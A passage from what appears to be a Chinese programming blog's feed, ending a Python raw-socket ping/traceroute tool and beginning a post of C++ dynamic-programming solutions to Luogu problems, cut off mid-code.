number">0</span><span class="token operator">:</span>                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"来自 &#123;0&#125; 的回复: 字节 = 32 时间 = &#123;1&#125;ms TTL = &#123;2&#125; "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>                    addr<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ttl<span class="token punctuation">[</span><span class="token char">'TTL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                accept <span class="token operator">+=</span> <span class="token number">1</span>                return_time <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>                sumtime <span class="token operator">+=</span> return_time                longtime <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>longtime<span class="token punctuation">,</span> return_time<span class="token punctuation">)</span>                shorttime <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>return_time<span class="token punctuation">,</span> shorttime<span class="token punctuation">)</span>                time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.7</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token operator">:</span>                lost <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"请求超时。"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> send <span class="token operator">==</span> <span class="token number">4</span><span class="token operator">:</span>                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;0&#125; 的 Ping 统计信息:"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">print</span><span class="token punctuation">(</span>                    <span class="token string">"\t数据包：已发送 = &#123;0&#125;,接收 = &#123;1&#125;，丢失 = &#123;2&#125;（&#123;3&#125;%丢失），\n往返行程的估计时间（以毫秒为单位）：\n\t最短 = &#123;4&#125;ms，最长 = &#123;5&#125;ms，平均 = &#123;6&#125;ms"</span>                    <span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost<span class="token punctuation">,</span> lost <span class="token operator">/</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span>                            shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> sumtime <span class="token operator">/</span> send<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">TraceRoute</span><span class="token punctuation">(</span>PING<span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送请求报文</span></span>    TYPE_ECHO_REQUEST <span class="token operator">=</span> <span class="token number">8</span>    CODE_ECHO_REQUEST_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送应答报文</span></span>    TYPE_ECHO_REPLY <span class="token operator">=</span> <span class="token number">0</span>    CODE_ECHO_REPLY_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 数据报超时报文</span></span>    TYPE_ICMP_OVERTIME <span class="token operator">=</span> <span class="token number">11</span>    CODE_TTL_OVERTIME <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 目的站不可达报文</span></span>    TYPE_ICMP_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    CODE_NET_UNREACHED <span class="token operator">=</span> <span class="token number">0</span>    CODE_HOST_UNREACHED <span class="token operator">=</span> <span class="token number">1</span>    CODE_PORT_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    MAX_HOPS <span class="token operator">=</span> <span class="token number">30</span>  # 设置路由转发最大跳数为<span class="token number">30</span>    TIMEOUT <span class="token operator">=</span> <span class="token number">1</span>  # 如果一个请求超过<span class="token number">1</span>s未得到响应，则被认定为超时    TRIES <span class="token operator">=</span> <span class="token number">3</span>  # 对于每个中间站点，探测的次数设置为<span class="token number">3</span>    def <span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span><span class="token operator">:</span>        #实例化一个socket对象，ipv4，原套接字，分配协议端口        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span><span class="token function">getprotobyname</span><span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        rawsocket<span class="token punctuation">.</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>IP_TTL<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>        #记录当前请求时间        send_request_traceroute_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        #发送数据到网络        rawsocket<span class="token punctuation">.</span><span class="token function">sendto</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #返回数据        <span class="token keyword">return</span> send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    def <span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">icmp</span><span class="token expression">数据包的构建</span></span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  # <span class="token string">"...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  #Identifier        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  #Sequence number        payload_body <span class="token operator">=</span> b<span class="token char">'abcdefghijklmnopqrstuvwabcdefghi'</span>  #data        #  把字节打包成二进制数据        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">chesksum</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  #获取校验和        #  把校验和传入，再次打包        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    def <span class="token function">traceroute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\nrouting &#123;0&#125;[&#123;1&#125;](max hops = 30, detect tries = 3)\n"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>            host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> ttl in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>MAX_HOPS<span class="token punctuation">)</span><span class="token operator">:</span>            time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>            <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:&lt;3d&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ttl<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> False            <span class="token keyword">for</span> tries in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TRIES<span class="token punctuation">)</span><span class="token operator">:</span>                imcp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>                send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>                    dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>                ready <span class="token operator">=</span> select<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">)</span>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                during_time <span class="token operator">=</span> end_time <span class="token operator">-</span> send_request_traceroute_time                global ip_head<span class="token punctuation">,</span> receive_packet<span class="token punctuation">,</span> addr                <span class="token keyword">if</span> during_time <span class="token operator">>=</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:>7&#125;    "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:7.2f&#125; ms "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>during_time <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                    flag <span class="token operator">=</span> True                    receive_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span><span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    ip_head <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">parse_ip_header</span><span class="token punctuation">(</span>receive_packet<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>tries <span class="token operator">>=</span> self<span class="token punctuation">.</span>TRIES <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" request timeout"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    icmp_head <span class="token operator">=</span> receive_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span>                    type<span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>                        <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmp_head<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_UNREACHED <span class="token operator">and</span> flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" Wrong!unreached net/host/port!"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_OVERTIME<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"program run over!"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    <span class="token keyword">else</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>def <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Usage: tool.py [-T host ] [-h help] [-P host]\n"</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Options:"</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"       -P       ping &lt;host>"</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"       -T       traceroute &lt;host>"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-P"</span> <span class="token operator">or</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-p"</span><span class="token punctuation">)</span><span class="token operator">:</span>        T <span class="token operator">=</span> <span class="token function">PING</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span><span class="token function">ping</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token function">elif</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-T"</span> <span class="token operator">or</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-t"</span><span class="token punctuation">)</span><span class="token operator">:</span>        T <span class="token operator">=</span> <span class="token function">TraceRoute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span><span class="token function">traceroute</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token operator">:</span>        <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态规划练习</title>
      <link href="/2021/09/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/09/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划练习"><a href="#动态规划练习" class="headerlink" title="动态规划练习"></a>动态规划练习</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于很久没有做动态规划相关题目，导致思维迟钝，便打算和SLM一起做做题单。初步刷的是洛谷的<a href="https://www.luogu.com.cn/training/list?keyword=%E5%8A%A8%E6%80%81&amp;page=1">题单</a>，中途可能也会加一下刷周赛的时候碰到的题目。</p><h3 id="动态规划的引入"><a href="#动态规划的引入" class="headerlink" title="动态规划的引入"></a><a href="https://www.luogu.com.cn/training/211#problems">动态规划的引入</a></h3><h4 id="P1434-滑雪"><a href="#P1434-滑雪" class="headerlink" title="P1434 滑雪"></a><a href="https://www.luogu.com.cn/problem/P1434">P1434 滑雪</a></h4><ul><li><p>题意：<br>给定一个矩阵，求最长的递减数组的长度。</p></li><li><p>题解:<br>这题目算是经典的模型了，如果使用搜索那么会有大量的对于重复问题的计算，那么就可以使用记忆化搜索来简化运算。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> dirx<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> diry<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> ux<span class="token punctuation">,</span><span class="token keyword">int</span> uy<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tx <span class="token operator">=</span> ux <span class="token operator">+</span> dirx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ty <span class="token operator">=</span> uy <span class="token operator">+</span> diry<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> tx <span class="token operator">></span> n <span class="token operator">||</span> ty <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> ty <span class="token operator">></span> m<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span> <span class="token operator">></span> mp<span class="token punctuation">[</span>tx<span class="token punctuation">]</span><span class="token punctuation">[</span>ty<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>tx<span class="token punctuation">,</span> ty<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            cin <span class="token operator">>></span> mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2196-挖地雷"><a href="#P2196-挖地雷" class="headerlink" title="P2196 挖地雷"></a><a href="https://www.luogu.com.cn/problem/P2196">P2196 挖地雷</a></h4><ul><li><p>题意：<br>给一个图，和图上每个点的权值，求最大的连续点的权值和，并且输出这些点。</p></li><li><p>题解:<br>在动态规划的时候记录一下路径即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> pre<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> val<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> nxt<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>nxt<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>nxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> ux<span class="token 